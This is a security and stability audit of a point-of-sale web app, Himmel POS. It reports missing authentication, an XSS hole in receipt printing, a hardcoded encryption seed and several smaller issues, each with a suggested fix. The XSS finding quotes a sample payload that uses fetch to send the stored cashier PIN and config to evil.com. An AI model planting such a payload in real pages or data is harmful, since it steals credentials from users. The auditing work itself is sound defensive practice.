# 🔒 Himmel POS — Security, Stability & Edge Case Audit

**Date:** 2026-07-30
**Scope:** Full-stack audit — Python FastAPI backend + React/Vite frontend
**Auditor:** Automated static analysis + manual code review

---

## Summary

| Severity | Count | Status |
|----------|-------|--------|
| 🔴 CRITICAL | 2 | Requires immediate attention |
| 🟠 HIGH | 5 | Should fix before production deployment |
| 🟡 MEDIUM | 7 | Recommended improvements |
| 🔵 LOW | 4 | Minor hardening |

---

## 🔴 CRITICAL

### C1. No Authentication on Any API Endpoint

**Files:** All routers in `backend/routers/` — `sales.py`, `config.py`, `printer.py`, `eet.py`, `catalog.py`

**Issue:** Zero authentication or authorization on all API endpoints. Any process or device with network access to port 8000 can create sales, modify store config, upload certificates, delete transactions, and trigger EET submissions.

**Impact:** On a shared network, a malicious actor can fabricate sales, alter tax IDs (IČO/DIČ), steal EET certificates, or delete transaction history — all without credentials.

**Mitigating factor:** The shutdown endpoint (`POST /api/v1/system/shutdown`) and sale deletion (`DELETE /api/v1/sales/{id}`) do enforce localhost-only access. However, all other endpoints are completely open.

**Recommended Fix:**
1. **Minimum (local POS kiosk):** Add a shared API key via `X-API-Key` header, validated by FastAPI middleware. Store key in env var, not in code.
2. **Better:** Add session-based auth with the cashier PIN — require PIN verification via API before sensitive operations (config changes, cert upload, sale deletion).
3. **Best:** JWT token auth with role-based access (cashier vs admin).

---

### C2. XSS via HTML Injection in Receipt Print Popup

**File:** `src/components/ReceiptModal.jsx` — Lines ~51-210 (handlePrint)

**Issue:** User-controlled data (`item.name`, `storeConfig.storeName`, `storeConfig.street`, `saleData.refundReason`) is directly interpolated into HTML strings via template literals and rendered via `printWin.document.write(...)`. No escaping is performed.

**Impact:** A malicious catalog item name like `<img src=x onerror="fetch('http://evil.com/steal?pin='+localStorage.getItem('himmel_pos_config'))">` would execute JavaScript when the debug print preview is opened, potentially exfiltrating the cashier PIN and store configuration.

**Recommended Fix:**
```javascript
function escapeHtml(str) {
  if (!str) return '';
  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
// Then use: ${escapeHtml(item.name)} in all template strings
```

---

## 🟠 HIGH

### H1. Hardcoded Fernet Encryption Seed

**File:** `backend/services/security_utils.py` — Line 9

**Issue:** The Fernet encryption key is derived from a hardcoded fallback string `"himmel-pos-eet-secure-seed-v1"` when `APP_SECRET_KEY` env var is not set. This key protects EET certificate passwords stored in the database.

**Impact:** Anyone with source code access can decrypt all EET certificate passwords from the SQLite database. Since the app ships as a Docker image, the hardcoded seed is publicly available.

**Recommended Fix:**
1. Generate a random key on first startup, persist it to a `.env` file or OS keyring.
2. Fail loudly if `APP_SECRET_KEY` is not set in production: `raise ValueError("APP_SECRET_KEY must be set")`.
3. Document this in the deployment guide.

---

### H2. ~~Lock Screen is Client-Side Only — Trivially Bypassable~~ ✅ RESOLVED

**Files:** `src/components/LockScreenModal.jsx`, `src/App.jsx`, `backend/routers/config.py`, `src/api/posApi.js`

**Issue:** The cashier PIN lock was enforced purely as a React component overlay. The PIN was stored in plain text in `localStorage` under `himmel_pos_config`.

**Fix Applied:**
1. **Backend PIN verification:** New `POST /api/v1/config/verify-pin` endpoint — PIN is verified server-side against SHA-256 hash stored in SQLite database.
2. **Hash-on-save:** PIN is hashed with SHA-256 before storage. Existing plaintext PINs are auto-upgraded to hash on first successful verification.
3. **No PIN in API response:** `GET /api/v1/config` no longer returns `cashierPin` — returns `hasPin` boolean instead.
4. **Offline fallback:** When backend is unreachable, lock screen falls back to localStorage comparison (graceful degradation).
5. **Keypad isolation fix:** Lock screen keyboard listener uses capture phase + `stopImmediatePropagation` to prevent PIN digits from leaking into the ManualKeypad and global keypad handlers. App.jsx global handler also guards against `isAppLocked` state.

**Status:** ✅ Fixed — PIN no longer stored in plaintext, verification is server-side.

---

### H3. Missing React Error Boundary

**File:** `src/App.jsx`

**Issue:** No `ErrorBoundary` component wraps the application tree. Any unhandled rendering exception in any child component (Cart, ReceiptModal, SettingsView, etc.) will crash the entire React app → white screen.

**Impact:** A single edge case (e.g., unexpected null data from backend, malformed localStorage JSON) can halt all POS operations until a hard browser refresh.

**Recommended Fix:**
```jsx
class ErrorBoundary extends React.Component {
  state = { hasError: false, error: null };
  static getDerivedStateFromError(e) { return { hasError: true, error: e }; }
  render() {
    if (this.state.hasError) return (
      <div style={{padding:'2rem',textAlign:'center'}}>
        <h2>Chyba aplikace</h2>
        <button onClick={() => window.location.reload()}>Obnovit</button>
      </div>
    );
    return this.props.children;
  }
}
// Wrap <App /> in index.jsx
```

---

### H4. Cashier PIN Stored in Plain Text in localStorage

**File:** `src/App.jsx` — Lines ~207-221

**Issue:** The entire `storeConfig` object (including `cashierPin`, `csobTerminalIp`, `csobTerminalId`) is serialized as plain JSON into `localStorage`.

**Impact:** Physical access to the browser or any XSS exploit (see C2) can extract the PIN and terminal configuration.

**Recommended Fix:** Exclude `cashierPin` from localStorage serialization. Load it from backend API on demand.

---

### H5. Floating-Point Currency Precision Errors

**Files:** `src/App.jsx` — Lines ~574-607, `src/components/Cart.jsx`

**Issue:** Tax calculations (`netPrice`, `taxAmount`, `totalAmount`) use native JavaScript floating-point arithmetic without rounding intermediate results. The backend uses `Decimal` rounding, but the frontend does not.

**Impact:** `0.1 + 0.2 = 0.30000000000000004` — 1-cent discrepancies can accumulate across items, causing EET tax summary mismatches or incorrect change calculations.

**Recommended Fix:** Round all currency values in the frontend using:
```javascript
const roundCZK = (v) => Math.round(v * 100) / 100;
```
Apply before accumulating into `taxSummary` and before sending to backend.

---

## 🟡 MEDIUM

### M1. Potential Duplicate Receipt Numbers

**File:** `src/App.jsx` — Lines ~125-136

**Issue:** Receipt sequence numbers are generated client-side by parsing the highest existing number in `salesHistory` array. If the array is paginated, filtered, or if two tabs/devices complete a sale simultaneously, duplicate receipt numbers can occur.

**Impact:** Duplicate receipt numbers violate EET fiscal compliance requirements.

**Recommended Fix:** Move receipt number generation to the backend using an atomic database counter (`SELECT MAX(receipt_number) + 1 ... FOR UPDATE` or SQLite autoincrement).

---

### M2. Multi-Tab State Overwrite Race Condition

**File:** `src/App.jsx` — Lines ~207-221

**Issue:** Multiple `useEffect` hooks aggressively write state (`salesHistory`, `presets`, `config`) to `localStorage`. If the POS is opened in multiple browser tabs, saving in one tab silently overwrites the other tab's state.

**Impact:** Data loss for offline-cached presets or sales history if two tabs are used simultaneously.

**Recommended Fix:** Add a `window.addEventListener('storage', ...)` listener to reactively sync across tabs, or rely entirely on the backend SQLite database.

---

### M3. No Rate Limiting on PIN Attempts

**File:** `src/components/LockScreenModal.jsx`

**Issue:** No rate limiting or lockout on failed PIN attempts. A 4-digit PIN has only 10,000 combinations and can be brute-forced in seconds with DevTools scripting.

**Recommended Fix:** Add exponential backoff after 3 failed attempts (e.g., 5s → 15s → 60s lockout). Display remaining lockout time.

---

### M4. `get_czech_now()` Missing Import

**File:** `backend/services/security_utils.py` — Line 41

**Issue:** `get_czech_now()` references `datetime` on line 41 (`datetime.now(...)`) but `datetime` is only imported inside the `except` block on line 43. In the success path (`ZoneInfo` available), if `datetime` is not imported at module level, this will raise `NameError`.

**Recommended Fix:** Add `from datetime import datetime` at the top of the file.

---

### M5. Unbounded Cart Quantity Increment

**File:** `src/components/Cart.jsx`

**Issue:** Cart item quantities can be incremented infinitely. No upper bound validation exists.

**Impact:** Accidentally or maliciously setting quantity to millions causes UI breakage, potential integer overflow on backend, and NaN calculation cascades.

**Recommended Fix:** `const newQty = Math.min(9999, currentQty + 1);`

---

### M6. Certificate Upload — No File Size Limit

**File:** `backend/routers/eet.py` — Lines 72-116

**Issue:** The `/api/v1/eet/upload-cert` endpoint accepts file uploads without size limits. A large file upload could exhaust disk space or memory.

**Recommended Fix:** Add `if file.size and file.size > 1_000_000: raise HTTPException(413, "File too large")` before processing.

---

### M7. Raw SQL in Auto-Migration Engine — Safe but Fragile

**File:** `backend/main.py` — Line 54

**Issue:** `conn.execute(text(f"ALTER TABLE {table} ADD COLUMN {col} {col_type}"))` uses f-string interpolation for SQL. While the `MIGRATIONS` tuple is hardcoded and not user-controlled (so no injection risk), this pattern is fragile and could become dangerous if the migration source ever changes.

**Recommended Fix:** Use parameterized identifiers or add a code comment explicitly noting the safety invariant: `# SAFETY: table/col/col_type are hardcoded constants, never user input`.

---

## 🔵 LOW

### L1. CORS Allows Credentials with Wildcard Methods/Headers

**File:** `backend/main.py` — Lines 71-77

**Issue:** `allow_methods=["*"]` and `allow_headers=["*"]` combined with `allow_credentials=True`. While origins are restricted, this is overly permissive.

**Recommended Fix:** Restrict to `allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"]` and `allow_headers=["Content-Type", "X-Admin-Override"]`.

---

### L2. Shutdown Endpoint Executes Shell Commands

**File:** `backend/main.py` — Lines 160-165

**Issue:** `subprocess.run('taskkill...', shell=True)` uses `shell=True` which is a command injection risk if any argument were ever derived from user input. Currently all arguments are hardcoded strings.

**Mitigating factor:** Endpoint is localhost-restricted and arguments are static.

**Recommended Fix:** Use `subprocess.run(["taskkill", "/T", "/F", "/FI", ...], shell=False)` for defense-in-depth.

---

### L3. `decrypt_secret()` Silently Returns Ciphertext on Failure

**File:** `backend/services/security_utils.py` — Lines 32-34

**Issue:** If decryption fails (e.g., wrong key), `decrypt_secret()` returns the raw ciphertext as a plain string. This could cause confusing downstream errors when the ciphertext is used as a certificate password.

**Recommended Fix:** Log a warning when falling back to raw string. Consider returning empty string or raising an exception in production mode.

---

### L4. Printer Device Discovery — `lpstat` Subprocess is Safe

**File:** `backend/services/escpos_service.py` — Line 45

**Issue:** `subprocess.run(["lpstat", "-p"], ...)` — uses list form (no `shell=True`), so no command injection risk. However, no error logging on failure.

**Status:** ✅ Safe. No action needed.

---

## Recommended Priority Order

| Priority | Action | Effort |
|----------|--------|--------|
| 1 | **C2** — Add `escapeHtml()` to ReceiptModal template strings | 30 min |
| 2 | **H1** — Generate random APP_SECRET_KEY on first startup | 1 hr |
| 3 | **H3** — Add ErrorBoundary wrapper | 30 min |
| 4 | **H5** — Add `roundCZK()` to frontend currency calculations | 1 hr |
| 5 | **M4** — Fix `datetime` import in `security_utils.py` | 5 min |
| 6 | **M5** — Add cart quantity upper bound | 10 min |
| 7 | **H4** — Exclude cashierPin from localStorage | 30 min |
| 8 | **C1** — Add API key middleware (if deploying on network) | 2-4 hr |
| 9 | **M1** — Move receipt numbering to backend | 2 hr |
| 10 | **M3** — Add PIN attempt rate limiting | 1 hr |

---

> **Context:** This POS system runs as a local kiosk (`localhost:5173` ↔ `localhost:8000`) on a dedicated cashier machine. Many findings (C1, H2) are standard for local-only POS systems where physical access implies full access. Prioritize fixes based on actual deployment environment (dedicated kiosk vs. shared network).
